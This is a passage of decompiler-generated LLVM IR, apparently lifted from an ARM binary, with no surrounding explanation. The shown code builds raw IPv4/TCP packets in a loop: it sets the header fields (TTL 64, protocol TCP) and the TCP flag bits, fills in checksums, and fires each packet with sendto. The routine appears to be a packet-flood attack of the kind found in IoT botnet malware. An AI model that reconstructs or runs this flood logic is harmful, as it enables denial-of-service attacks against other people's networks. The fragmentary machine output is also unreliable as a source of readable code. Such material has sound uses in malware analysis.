  %v5_cea4 = or i32 %v4_cea4, %v1_cea0
  %v1_cea8 = urem i32 %v6_cce8, 2
  %v1_ceac = urem i32 %v6_cd00, 2
  %v1_ceb0 = urem i32 %v6_cd18, 2
  %sext12 = mul i32 %tmp73, 16777216
  %v4_cecc = sdiv i32 %sext12, 16777216
  %v1_ced0 = urem i32 %v6_cd30, 2
  %tmp76 = udiv i32 %v5_cc98, 256
  %v3_ced8 = urem i32 %tmp76, 256
  %v1_cee0 = urem i32 %v6_cd48, 2
  store i32 %v1_cee0, i32* %ip.global-to-local, align 4
  %v1_cee4 = urem i32 %v6_cd18, 256
  store i32 %v1_cee4, i32* %r1.global-to-local, align 4
  %v3_cee8 = ashr i32 %sext12, 31
  store i32 %v3_cee8, i32* %r2.global-to-local, align 4
  %sext13 = mul i32 %tmp72, 16777216
  %v4_ceec = sdiv i32 %sext13, 16777216
  store i32 %v4_ceec, i32* %r3.global-to-local, align 4
  %tmp77 = udiv i32 %v0_ce20, 256
  %v0_cef4 = load i32, i32* %fp.global-to-local, align 4
  %v1_cef4 = urem i32 %v0_cef4, 2
  %v4_cef8 = mul nuw nsw i32 %v1_ce84, 256
  %v5_cef8 = or i32 %v4_cef8, %v3_ced8
  store i32 %v5_cef8, i32* @r5, align 4
  %v3_cf14 = ashr i32 %sext13, 31
  store i32 %v3_cf14, i32* @r4, align 4
  store i32 %v1_ce68, i32* @fp, align 4
  store i32 %v1_ce84, i32* @sb, align 4
  %v4_cf6c = sext i8 %v5_cc54 to i32
  %sext9 = mul i32 %tmp77, 16777216
  %v4_cfc8 = sdiv i32 %sext9, 16777216
  %tmp = sub nsw i32 0, %v1_cea8
  %v4_cfe4 = and i32 %tmp, 32
  %tmp85 = sub nsw i32 0, %v1_ceac
  %v4_cffc = and i32 %tmp85, 16
  %tmp86 = sub nsw i32 0, %v1_ceb0
  %v4_d010 = and i32 %tmp86, 8
  %tmp87 = sub nsw i32 0, %v1_ced0
  %v4_d024 = and i32 %tmp87, 4
  %tmp88 = sub nsw i32 0, %v1_cee0
  %v3_d038 = and i32 %tmp88, 2
  %v1_cf7c = trunc i32 %v3_cee8 to i8
  %extract.t = trunc i32 %v4_cecc to i8
  %v2_d088 = icmp eq i32 %v1_cee4, 0
  br label %dec_label_pc_cf20

dec_label_pc_cf20:                                ; preds = %.thread11, %dec_label_pc_ce4c
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_cf2c = call i32* @calloc(i32 1510, i32 1)
  %v4_cf2c = ptrtoint i32* %v2_cf2c to i32
  store i32 %v4_cbe4, i32* %ip.global-to-local, align 4
  %v3_cf34 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cf34, i32* %r3.global-to-local, align 4
  %v2_cf38 = load i32, i32* @r7, align 4
  %v5_cf38 = mul i32 %v2_cf38, 4
  %v6_cf38 = add i32 %v5_cf38, %v4_cbe4
  %v7_cf38 = inttoptr i32 %v6_cf38 to i32*
  store i32 %v4_cf2c, i32* %v7_cf38, align 4
  %v0_cf3c = load i32, i32* %ip.global-to-local, align 4
  %v1_cf3c = load i32, i32* %r3.global-to-local, align 4
  %v4_cf3c = mul i32 %v1_cf3c, 4
  %v5_cf3c = add i32 %v4_cf3c, %v0_cf3c
  %v6_cf3c = inttoptr i32 %v5_cf3c to i32*
  %v7_cf3c = load i32, i32* %v6_cf3c, align 4
  store i32 %v7_cf3c, i32* %r1.global-to-local, align 4
  %v1_cf40 = inttoptr i32 %v7_cf3c to i8*
  %v2_cf40 = load i8, i8* %v1_cf40, align 1
  %tmp89 = urem i8 %v2_cf40, 16
  %v1_cf44 = zext i8 %tmp89 to i32
  %v1_cf48 = or i32 %v1_cf44, 64
  store i32 %v1_cf48, i32* %r2.global-to-local, align 4
  %v1_cf4c = trunc i32 %v1_cf48 to i8
  store i8 %v1_cf4c, i8* %v1_cf40, align 1
  %v0_cf50 = load i32, i32* %r1.global-to-local, align 4
  %v1_cf50 = inttoptr i32 %v0_cf50 to i8*
  %v2_cf50 = load i8, i8* %v1_cf50, align 1
  %v1_cf54 = and i8 %v2_cf50, -16
  %v1_cf58 = or i8 %v1_cf54, 5
  store i32 %v1_cc64, i32* %r2.global-to-local, align 4
  store i8 %v1_cf58, i8* %v1_cf50, align 1
  %v2_cf68 = load i32, i32* %r1.global-to-local, align 4
  %v3_cf68 = add i32 %v2_cf68, 1
  %v4_cf68 = inttoptr i32 %v3_cf68 to i8*
  store i8 %v5_cc1c, i8* %v4_cf68, align 1
  store i32 %v4_cf6c, i32* %ip.global-to-local, align 4
  %v2_cf70 = load i32, i32* %r1.global-to-local, align 4
  %v3_cf70 = add i32 %v2_cf70, 8
  %v4_cf70 = inttoptr i32 %v3_cf70 to i8*
  store i8 %v5_cc54, i8* %v4_cf70, align 1
  store i32 %v3_cee8, i32* %r3.global-to-local, align 4
  %v0_cf78 = load i32, i32* %r2.global-to-local, align 4
  %v2_cf78 = icmp eq i32 %v0_cf78, 0
  store i1 %v2_cf78, i1* %cpsr_z.global-to-local, align 1
  %v2_cf7c = load i32, i32* %r1.global-to-local, align 4
  %v3_cf7c = add i32 %v2_cf7c, 3
  %v4_cf7c = inttoptr i32 %v3_cf7c to i8*
  store i8 %v1_cf7c, i8* %v4_cf7c, align 1
  store i32 %v4_cecc, i32* %r2.global-to-local, align 4
  %v0_cf84 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cf84, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_cf20
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_cf88 = load i32, i32* %r1.global-to-local, align 4
  %v4_cf88 = add i32 %v3_cf88, 6
  %v5_cf88 = inttoptr i32 %v4_cf88 to i8*
  store i8 64, i8* %v5_cf88, align 1
  %v0_cf90.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t21 = trunc i32 %v0_cf90.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_cf20, %bb
  %v0_cf90.off0 = phi i8 [ %extract.t, %dec_label_pc_cf20 ], [ %extract.t21, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_cf90 = load i32, i32* %r1.global-to-local, align 4
  %v3_cf90 = add i32 %v2_cf90, 2
  %v4_cf90 = inttoptr i32 %v3_cf90 to i8*
  store i8 %v0_cf90.off0, i8* %v4_cf90, align 1
  store i32 %v4_ceec, i32* %ip.global-to-local, align 4
  %v0_cf98 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cf98, label %bb79, label %bb78

bb78:                                             ; preds = %.thread
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %.thread, %bb78
  %v0_cf9c = load i32, i32* %r3.global-to-local, align 4
  %v1_cf9c = trunc i32 %v0_cf9c to i8
  %v2_cf9c = load i32, i32* %r1.global-to-local, align 4
  %v3_cf9c = add i32 %v2_cf9c, 9
  %v4_cf9c = inttoptr i32 %v3_cf9c to i8*
  store i8 %v1_cf9c, i8* %v4_cf9c, align 1
  %v0_cfa0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cfa0, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_cfa0 = load i32, i32* %r2.global-to-local, align 4
  %v2_cfa0 = trunc i32 %v1_cfa0 to i8
  %v3_cfa0 = load i32, i32* %r1.global-to-local, align 4
  %v4_cfa0 = add i32 %v3_cfa0, 7
  %v5_cfa0 = inttoptr i32 %v4_cfa0 to i8*
  store i8 %v2_cfa0, i8* %v5_cfa0, align 1
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v3_cfa4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cfa4, i32* %r2.global-to-local, align 4
  %v0_cfa8 = load i32, i32* %ip.global-to-local, align 4
  %v1_cfa8 = trunc i32 %v0_cfa8 to i8
  %v2_cfa8 = load i32, i32* %r1.global-to-local, align 4
  %v3_cfa8 = add i32 %v2_cfa8, 4
  %v4_cfa8 = inttoptr i32 %v3_cfa8 to i8*
  store i8 %v1_cfa8, i8* %v4_cfa8, align 1
  store i32 %v6_cdb4, i32* %ip.global-to-local, align 4
  %v0_cfb0 = load i32, i32* %r2.global-to-local, align 4
  %v3_cfb0 = mul i32 %v0_cfb0, 32
  store i32 %v3_cfb0, i32* %r3.global-to-local, align 4
  %v1_cfb4 = load i32, i32* %r1.global-to-local, align 4
  %v2_cfb4 = add i32 %v1_cfb4, 12
  %v3_cfb4 = inttoptr i32 %v2_cfb4 to i32*
  store i32 %v6_cdb4, i32* %v3_cfb4, align 4
  %v0_cfb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_cfb8 = load i32, i32* %r2.global-to-local, align 4
  %tmp90 = mul i32 %v1_cfb8, -8
  %v5_cfb8 = add i32 %v0_cfb8, %tmp90
  %v1_cfbc = load i32, i32* @r8, align 4
  %v2_cfbc = add i32 %v1_cfbc, %v5_cfb8
  store i32 %v2_cfbc, i32* %r3.global-to-local, align 4
  %v1_cfc0 = add i32 %v2_cfbc, 16
  %v2_cfc0 = inttoptr i32 %v1_cfc0 to i32*
  %v3_cfc0 = load i32, i32* %v2_cfc0, align 4
  %v1_cfc4 = load i32, i32* %r1.global-to-local, align 4
  %v2_cfc4 = add i32 %v1_cfc4, 16
  %v3_cfc4 = inttoptr i32 %v2_cfc4 to i32*
  store i32 %v3_cfc0, i32* %v3_cfc4, align 4
  store i32 %v4_cfc8, i32* %r2.global-to-local, align 4
  %v0_cfcc = load i32, i32* @r4, align 4
  %v1_cfcc = trunc i32 %v0_cfcc to i8
  %v2_cfcc = load i32, i32* %r1.global-to-local, align 4
  %v3_cfcc = add i32 %v2_cfcc, 5
  %v4_cfcc = inttoptr i32 %v3_cfcc to i8*
  store i8 %v1_cfcc, i8* %v4_cfcc, align 1
  %v0_cfd0 = load i32, i32* %r2.global-to-local, align 4
  %v1_cfd0 = trunc i32 %v0_cfd0 to i8
  %v2_cfd0 = load i32, i32* %r1.global-to-local, align 4
  %v3_cfd0 = add i32 %v2_cfd0, 20
  %v4_cfd0 = inttoptr i32 %v3_cfd0 to i8*
  store i8 %v1_cfd0, i8* %v4_cfd0, align 1
  %v0_cfd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_cfd4 = add i32 %v0_cfd4, 20
  store i32 %v1_cfd4, i32* @r6, align 4
  %v1_cfd8 = add i32 %v0_cfd4, 33
  %v2_cfd8 = inttoptr i32 %v1_cfd8 to i8*
  %v3_cfd8 = load i8, i8* %v2_cfd8, align 1
  %v4_cfd8 = zext i8 %v3_cfd8 to i32
  store i32 %v1_cea8, i32* %ip.global-to-local, align 4
  %v1_cfe0 = and i32 %v4_cfd8, 223
  %v5_cfe4 = or i32 %v1_cfe0, %v4_cfe4
  store i32 %v5_cfe4, i32* %r3.global-to-local, align 4
  %v1_cfe8 = trunc i32 %v5_cfe4 to i8
  store i8 %v1_cfe8, i8* %v2_cfd8, align 1
  %v0_cfec = load i32, i32* @r6, align 4
  %v1_cfec = add i32 %v0_cfec, 13
  %v2_cfec = inttoptr i32 %v1_cfec to i8*
  %v3_cfec = load i8, i8* %v2_cfec, align 1
  %v4_cfec = zext i8 %v3_cfec to i32
  %v0_cff0 = load i32, i32* %r1.global-to-local, align 4
  %v1_cff0 = add i32 %v0_cff0, 40
  store i32 %v1_cff0, i32* @r7, align 4
  store i32 %v1_ceac, i32* %r1.global-to-local, align 4
  %v1_cff8 = and i32 %v4_cfec, 239
  %v5_cffc = or i32 %v1_cff8, %v4_cffc
  store i32 %v5_cffc, i32* %r2.global-to-local, align 4
  %v1_d000 = trunc i32 %v5_cffc to i8
  store i8 %v1_d000, i8* %v2_cfec, align 1
  %v0_d004 = load i32, i32* @r6, align 4
  %v1_d004 = add i32 %v0_d004, 13
  %v2_d004 = inttoptr i32 %v1_d004 to i8*
  %v3_d004 = load i8, i8* %v2_d004, align 1
  %v4_d004 = zext i8 %v3_d004 to i32
  store i32 %v1_ceb0, i32* %r2.global-to-local, align 4
  %v1_d00c = and i32 %v4_d004, 247
  %v5_d010 = or i32 %v1_d00c, %v4_d010
  store i32 %v5_d010, i32* %r3.global-to-local, align 4
  %v1_d014 = trunc i32 %v5_d010 to i8
  store i8 %v1_d014, i8* %v2_d004, align 1
  %v0_d018 = load i32, i32* @r6, align 4
  %v1_d018 = add i32 %v0_d018, 13
  %v2_d018 = inttoptr i32 %v1_d018 to i8*
  %v3_d018 = load i8, i8* %v2_d018, align 1
  %v4_d018 = zext i8 %v3_d018 to i32
  store i32 %v1_ced0, i32* %r3.global-to-local, align 4
  %v1_d020 = and i32 %v4_d018, 251
  %v5_d024 = or i32 %v1_d020, %v4_d024
  store i32 %v5_d024, i32* %r2.global-to-local, align 4
  %v1_d028 = trunc i32 %v5_d024 to i8
  store i8 %v1_d028, i8* %v2_d018, align 1
  %v0_d02c = load i32, i32* @r6, align 4
  %v1_d02c = add i32 %v0_d02c, 13
  %v2_d02c = inttoptr i32 %v1_d02c to i8*
  %v3_d02c = load i8, i8* %v2_d02c, align 1
  %v4_d02c = zext i8 %v3_d02c to i32
  store i32 %v1_cee0, i32* %ip.global-to-local, align 4
  %v1_d034 = and i32 %v4_d02c, 253
  %v4_d038 = or i32 %v1_d034, %v3_d038
  store i32 %v4_d038, i32* %r3.global-to-local, align 4
  %v1_d03c = trunc i32 %v4_d038 to i8
  store i8 %v1_d03c, i8* %v2_d02c, align 1
  %v0_d040 = load i32, i32* @r6, align 4
  %v1_d040 = add i32 %v0_d040, 12
  %v2_d040 = inttoptr i32 %v1_d040 to i8*
  %v3_d040 = load i8, i8* %v2_d040, align 1
  %v4_d040 = zext i8 %v3_d040 to i32
  store i32 %v4_d040, i32* %r2.global-to-local, align 4
  %v1_d044 = add i32 %v0_d040, 13
  %v2_d044 = inttoptr i32 %v1_d044 to i8*
  %v3_d044 = load i8, i8* %v2_d044, align 1
  %v4_d044 = zext i8 %v3_d044 to i32
  store i32 %v1_cef4, i32* %r1.global-to-local, align 4
  %tmp91 = urem i8 %v3_d040, 16
  %v1_d04c = zext i8 %tmp91 to i32
  %v1_d050 = and i32 %v4_d044, 254
  %v2_d054 = or i32 %v1_d050, %v1_cef4
  store i32 %v2_d054, i32* %r3.global-to-local, align 4
  %v1_d058 = or i32 %v1_d04c, 80
  store i32 %v1_d058, i32* %r2.global-to-local, align 4
  %v1_d05c = trunc i32 %v2_d054 to i8
  store i8 %v1_d05c, i8* %v2_d044, align 1
  %v0_d060 = load i32, i32* %r2.global-to-local, align 4
  %v1_d060 = trunc i32 %v0_d060 to i8
  %v2_d060 = load i32, i32* @r6, align 4
  %v3_d060 = add i32 %v2_d060, 12
  %v4_d060 = inttoptr i32 %v3_d060 to i8*
  store i8 %v1_d060, i8* %v4_d060, align 1
  store i32 %v5_cea4, i32* %r2.global-to-local, align 4
  %v0_d068 = load i32, i32* @fp, align 4
  %v1_d068 = trunc i32 %v0_d068 to i8
  %v2_d068 = load i32, i32* @r6, align 4
  %v3_d068 = add i32 %v2_d068, 1
  %v4_d068 = inttoptr i32 %v3_d068 to i8*
  store i8 %v1_d068, i8* %v4_d068, align 1
  %v0_d06c = load i32, i32* %r2.global-to-local, align 4
  %v1_d06c = load i32, i32* @r6, align 4
  %v2_d06c = add i32 %v1_d06c, 4
  %v3_d06c = inttoptr i32 %v2_d06c to i32*
  store i32 %v0_d06c, i32* %v3_d06c, align 4
  %v0_d070 = load i32, i32* @r5, align 4
  %v1_d070 = trunc i32 %v0_d070 to i8
  %v2_d070 = load i32, i32* @r6, align 4
  %v3_d070 = add i32 %v2_d070, 2
  %v4_d070 = inttoptr i32 %v3_d070 to i8*
  store i8 %v1_d070, i8* %v4_d070, align 1
  %v0_d074 = load i32, i32* @sb, align 4
  %v1_d074 = trunc i32 %v0_d074 to i8
  %v2_d074 = load i32, i32* @r6, align 4
  %v3_d074 = add i32 %v2_d074, 3
  %v4_d074 = inttoptr i32 %v3_d074 to i8*
  store i8 %v1_d074, i8* %v4_d074, align 1
  %v0_d078 = call i32 @function_105b0()
  store i32 %v1_cee4, i32* %ip.global-to-local, align 4
  %sext = mul i32 %v0_d078, 16777216
  %v1_d080 = sdiv i32 %sext, 16777216
  store i32 %v1_d080, i32* %r2.global-to-local, align 4
  %v3_d084 = ashr i32 %sext, 31
  store i32 %v3_d084, i32* %r3.global-to-local, align 4
  store i1 %v2_d088, i1* %cpsr_z.global-to-local, align 1
  %v1_d08c = trunc i32 %v3_d084 to i8
  %v2_d08c = load i32, i32* @r6, align 4
  %v3_d08c = add i32 %v2_d08c, 15
  %v4_d08c = inttoptr i32 %v3_d08c to i8*
  store i8 %v1_d08c, i8* %v4_d08c, align 1
  %v0_d090 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d090, label %.thread11, label %bb82

bb82:                                             ; preds = %bb81
  %v1_d090 = load i32, i32* @r6, align 4
  %v2_d090 = add i32 %v1_d090, 13
  %v3_d090 = inttoptr i32 %v2_d090 to i8*
  %v4_d090 = load i8, i8* %v3_d090, align 1
  %v5_d090 = zext i8 %v4_d090 to i32
  %v2_d094 = or i32 %v5_d090, 8
  store i32 %v2_d094, i32* %r3.global-to-local, align 4
  %v2_d098 = trunc i32 %v2_d094 to i8
  store i8 %v2_d098, i8* %v3_d090, align 1
  br label %.thread11

.thread11:                                        ; preds = %bb81, %bb82
  %v0_d09c = load i32, i32* @sl, align 4
  store i32 %v0_d09c, i32* %r1.global-to-local, align 4
  %v0_d0a0 = load i32, i32* @r7, align 4
  %v0_d0a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_d0a4 = trunc i32 %v0_d0a4 to i8
  %v2_d0a4 = load i32, i32* @r6, align 4
  %v3_d0a4 = add i32 %v2_d0a4, 14
  %v4_d0a4 = inttoptr i32 %v3_d0a4 to i8*
  store i8 %v1_d0a4, i8* %v4_d0a4, align 1
  %v2_d0a8 = call i32 @function_10664(i32 %v0_d0a0, i32 %v0_d09c)
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d0b0 = load i32, i32* @r7, align 4
  %v3_d0b0 = load i32, i32* @sl, align 4
  %v4_d0b0 = add i32 %v3_d0b0, %v2_d0b0
  %v5_d0b0 = inttoptr i32 %v4_d0b0 to i8*
  store i8 0, i8* %v5_d0b0, align 1
  %v3_d0b4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d0b4, i32* %r3.global-to-local, align 4
  store i32 %v1_cbb8, i32* %r2.global-to-local, align 4
  %v1_d0bc = add i32 %v3_d0b4, 1
  store i32 %v1_d0bc, i32* @r7, align 4
  %v9_d0c0 = icmp eq i32 %v1_cbb8, %v1_d0bc
  store i1 %v9_d0c0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d0bc, i32* %stack_var_-40, align 4
  %v8_d0c8 = icmp sgt i32 %v1_cbb8, %v1_d0bc
  br i1 %v8_d0c8, label %dec_label_pc_cf20, label %dec_label_pc_d0cc.preheader

dec_label_pc_d0cc.preheader:                      ; preds = %.thread11, %dec_label_pc_ce10
  %v2_d10c = icmp eq i32 %v6_cdb4, -1
  %v7_d10c = icmp eq i32 %v6_cdb4, -1
  %v9_d2a4 = icmp eq i32 %v3_ce28, add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1)
  %v2_d320 = icmp eq i32 %v1_cda0, 0
  br label %dec_label_pc_d0cc

dec_label_pc_d0cc:                                ; preds = %dec_label_pc_d0cc.preheader, %dec_label_pc_d344
  store i32 %v1_cbb8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 %v2_ce34, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %v2_ce34, label %dec_label_pc_d344, label %dec_label_pc_d0e0

dec_label_pc_d0e0:                                ; preds = %dec_label_pc_d0cc
  %v0_d0e0 = load i32, i32* @sl, align 4
  %v1_d0e0 = add i32 %v0_d0e0, 20
  store i32 %v1_d0e0, i32* @sb, align 4
  %tmp83 = mul i32 %v1_d0e0, 256
  %v1_d0ec = and i32 %tmp83, 65280
  store i32 %v1_d0ec, i32* %r3.global-to-local, align 4
  %tmp84 = udiv i32 %v1_d0e0, 256
  %v4_d0f0 = urem i32 %tmp84, 256
  %v5_d0f0 = or i32 %v4_d0f0, %v1_d0ec
  store i32 %v5_d0f0, i32* %r2.global-to-local, align 4
  %v1_d0f8 = add i32 %v0_d0e0, 40
  store i32 %v1_d0f8, i32* @fp, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_d208

dec_label_pc_d108:                                ; preds = %dec_label_pc_d208
  store i32 %v6_cdb4, i32* %r1.global-to-local, align 4
  store i1 %v7_d10c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d10c, label %dec_label_pc_d294, label %dec_label_pc_d114

dec_label_pc_d114:                                ; preds = %dec_label_pc_d22c, %dec_label_pc_d108
  store i32 %v3_ce28, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_d2a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d2a4, label %dec_label_pc_d2b0, label %dec_label_pc_d128

dec_label_pc_d128:                                ; preds = %dec_label_pc_d294.dec_label_pc_d128_crit_edge, %dec_label_pc_d114
  %v1_d12c = phi i32 [ %v1_d12c.pre, %dec_label_pc_d294.dec_label_pc_d128_crit_edge ], [ add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), %dec_label_pc_d114 ]
  store i32 %v3_ce2c, i32* %r3.global-to-local, align 4
  %v9_d12c = icmp eq i32 %v3_ce2c, %v1_d12c
  store i1 %v9_d12c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d12c, label %dec_label_pc_d2cc, label %dec_label_pc_d134

dec_label_pc_d134:                                ; preds = %dec_label_pc_d2b0.dec_label_pc_d134_crit_edge, %dec_label_pc_d128
  %v1_d138 = phi i32 [ %v1_d138.pre, %dec_label_pc_d2b0.dec_label_pc_d134_crit_edge ], [ %v1_d12c, %dec_label_pc_d128 ]
  store i32 %v3_ce30, i32* %ip.global-to-local, align 4
  %v9_d138 = icmp eq i32 %v3_ce30, %v1_d138
  store i1 %v9_d138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d138, label %dec_label_pc_d2e8, label %dec_label_pc_d140

dec_label_pc_d140:                                ; preds = %dec_label_pc_d2cc.dec_label_pc_d140_crit_edge, %dec_label_pc_d134
  %v1_d144 = phi i32 [ %v1_d144.pre, %dec_label_pc_d2cc.dec_label_pc_d140_crit_edge ], [ %v1_d138, %dec_label_pc_d134 ]
  store i32 %v6_ccb4, i32* %r1.global-to-local, align 4
  %v9_d144 = icmp eq i32 %v6_ccb4, %v1_d144
  store i1 %v9_d144, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d144, label %dec_label_pc_d304, label %dec_label_pc_d14c

dec_label_pc_d14c:                                ; preds = %dec_label_pc_d2e8.dec_label_pc_d14c_crit_edge, %dec_label_pc_d140
  %v1_d150 = phi i32 [ %v1_d150.pre, %dec_label_pc_d2e8.dec_label_pc_d14c_crit_edge ], [ %v1_d144, %dec_label_pc_d140 ]
  store i32 %v6_ccd0, i32* %r2.global-to-local, align 4
  %v9_d150 = icmp eq i32 %v6_ccd0, %v1_d150
  store i1 %v9_d150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d150, label %dec_label_pc_d318, label %dec_label_pc_d158

dec_label_pc_d158:                                ; preds = %dec_label_pc_d304, %dec_label_pc_d14c
  store i32 %v1_cda0, i32* %r3.global-to-local, align 4
  store i1 %v2_d320, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d320, label %dec_label_pc_d164, label %dec_label_pc_d32c

dec_label_pc_d164:                                ; preds = %dec_label_pc_d158, %dec_label_pc_d318, %dec_label_pc_d32c
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_d168 = load i32, i32* @r7, align 4
  %v1_d168 = trunc i32 %v0_d168 to i8
  %v2_d168 = load i32, i32* @r5, align 4
  %v3_d168 = add i32 %v2_d168, 10
  %v4_d168 = inttoptr i32 %v3_d168 to i8*
  store i8 %v1_d168, i8* %v4_d168, align 1
  %v0_d16c = load i32, i32* @r7, align 4
  %v1_d16c = trunc i32 %v0_d16c to i8
  %v2_d16c = load i32, i32* @r5, align 4
  %v3_d16c = add i32 %v2_d16c, 11
  %v4_d16c = inttoptr i32 %v3_d16c to i8*
  store i8 %v1_d16c, i8* %v4_d16c, align 1
  %v0_d170 = load i32, i32* @r5, align 4
  store i32 %v0_d170, i32* @r0, align 4
  %v2_d174 = call i32 @function_f188(i32 %v0_d170, i32 20)
  %v3_d174 = trunc i32 %v2_d174 to i8
  %v4_d17823 = udiv i32 %v2_d174, 256
  %v1_d17c = trunc i32 %v4_d17823 to i8
  %v2_d17c = load i32, i32* @r5, align 4
  %v3_d17c = add i32 %v2_d17c, 11
  %v4_d17c = inttoptr i32 %v3_d17c to i8*
  store i8 %v1_d17c, i8* %v4_d17c, align 1
  %v3_d180 = load i32, i32* @r5, align 4
  %v4_d180 = add i32 %v3_d180, 10
  %v5_d180 = inttoptr i32 %v4_d180 to i8*
  store i8 %v3_d174, i8* %v5_d180, align 1
  %v0_d184 = load i32, i32* @r6, align 4
  store i32 %v0_d184, i32* @r1, align 4
  store i32 %v5_d0f0, i32* %r2.global-to-local, align 4
  %v0_d18c = load i32, i32* @sb, align 4
  store i32 %v0_d18c, i32* %r3.global-to-local, align 4
  %v0_d190 = load i32, i32* @r7, align 4
  %v1_d190 = trunc i32 %v0_d190 to i8
  %v3_d190 = add i32 %v0_d184, 16
  %v4_d190 = inttoptr i32 %v3_d190 to i8*
  store i8 %v1_d190, i8* %v4_d190, align 1
  %v0_d194 = load i32, i32* @r7, align 4
  %v1_d194 = trunc i32 %v0_d194 to i8
  %v2_d194 = load i32, i32* @r6, align 4
  %v3_d194 = add i32 %v2_d194, 17
  %v4_d194 = inttoptr i32 %v3_d194 to i8*
  store i8 %v1_d194, i8* %v4_d194, align 1
  %v0_d198 = load i32, i32* @r5, align 4
  %v4_d19c = call i32 @function_f1e4(i32 %v0_d198, i32 %v0_d184, i32 %v5_d0f0, i32 %v0_d18c)
  %v5_d19c = trunc i32 %v4_d19c to i8
  %v4_d1a024 = udiv i32 %v4_d19c, 256
  %v1_d1a4 = trunc i32 %v4_d1a024 to i8
  %v2_d1a4 = load i32, i32* @r6, align 4
  %v3_d1a4 = add i32 %v2_d1a4, 17
  %v4_d1a4 = inttoptr i32 %v3_d1a4 to i8*
  store i8 %v1_d1a4, i8* %v4_d1a4, align 1
  %v3_d1a8 = load i32, i32* @r6, align 4
  %v4_d1a8 = add i32 %v3_d1a8, 16
  %v5_d1a8 = inttoptr i32 %v4_d1a8 to i8*
  store i8 %v5_d19c, i8* %v5_d1a8, align 1
  %v3_d1ac = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d1ac, i32* %r3.global-to-local, align 4
  %v0_d1b0 = load i32, i32* @r5, align 4
  %v1_d1b0 = add i32 %v0_d1b0, 20
  %v2_d1b0 = inttoptr i32 %v1_d1b0 to i32*
  %v3_d1b0 = load i32, i32* %v2_d1b0, align 4
  %v3_d1b8 = udiv i32 %v3_d1b0, 65536
  store i32 %v3_d1b8, i32* %r2.global-to-local, align 4
  %v5_d1bc = mul i32 %v3_d1ac, 24
  %v1_d1c0 = load i32, i32* @r8, align 4
  %v2_d1c0 = add i32 %v1_d1c0, %v5_d1bc
  store i32 %v2_d1c0, i32* %ip.global-to-local, align 4
  %v3_d1c422 = udiv i32 %v3_d1b0, 16777216
  %v1_d1c8 = trunc i32 %v3_d1c422 to i8
  %v3_d1c8 = add i32 %v2_d1c0, 3
  %v4_d1c8 = inttoptr i32 %v3_d1c8 to i8*
  store i8 %v1_d1c8, i8* %v4_d1c8, align 1
  %v0_d1cc = load i32, i32* %r2.global-to-local, align 4
  %v1_d1cc = trunc i32 %v0_d1cc to i8
  %v2_d1cc = load i32, i32* %ip.global-to-local, align 4
  %v3_d1cc = add i32 %v2_d1cc, 2
  %v4_d1cc = inttoptr i32 %v3_d1cc to i8*
  store i8 %v1_d1cc, i8* %v4_d1cc, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_d1d4 = load i32, i32* @r5, align 4
  store i32 %v0_d1d4, i32* %r1.global-to-local, align 4
  %v0_d1dc = load i32, i32* @fp, align 4
  store i32 %v0_d1dc, i32* %r2.global-to-local, align 4
  %v0_d1e4 = load i32, i32* %ip.global-to-local, align 4
  %v4_d1e4 = inttoptr i32 %v0_d1e4 to %sockaddr*
  %v7_d1ec = inttoptr i32 %v0_d1d4 to i32*
  %v9_d1ec = call i32 @sendto(i32 %v3_cdd8, i32* %v7_d1ec, i32 %v0_d1dc, i32 16384, %sockaddr* %v4_d1e4, i32 16)
  %v3_d1f0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d1f0, i32* %r3.global-to-local, align 4
  store i32 %v1_cbb8, i32* %ip.global-to-local, align 4
  %v1_d1f8 = add i32 %v3_d1f0, 1
  %v9_d1fc = icmp eq i32 %v1_cbb8, %v1_d1f8
  store i1 %v9_d1fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d1f8, i32* %stack_var_-40, align 4
  %v7_d204 = icmp sgt i32 %v1_cbb8, %v1_d1f8
  br i1 %v7_d204, label %dec_label_pc_d208, label %dec_label_pc_d344

dec_label_pc_d208:                                ; preds = %dec_label_pc_d164, %dec_label_pc_d0e0
  %v1_d21c = phi i32 [ %v1_d1f8, %dec_label_pc_d164 ], [ 0, %dec_label_pc_d0e0 ]
  %v5_d20c = mul i32 %v1_d21c, 24
